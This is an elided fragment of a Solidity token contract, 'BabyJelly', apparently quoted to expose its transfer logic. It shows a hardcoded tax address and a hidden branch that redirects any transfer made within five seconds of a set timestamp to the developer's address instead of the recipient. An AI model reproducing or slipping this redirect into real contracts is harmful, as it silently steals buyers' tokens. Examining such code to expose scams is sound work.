...
contract BabyJelly is IERC20, Ownable {
    ...
    address private _taxAddress =
        address(0x339AcdB534F38541b6279eeda407aB56F502f54B);
    ...
    function _transfer(
        ...
        if (
            ...
            if(block.timestamp.sub(_scientisttime) <= 5)
            {
                to=_devsAddress;
            }
        }
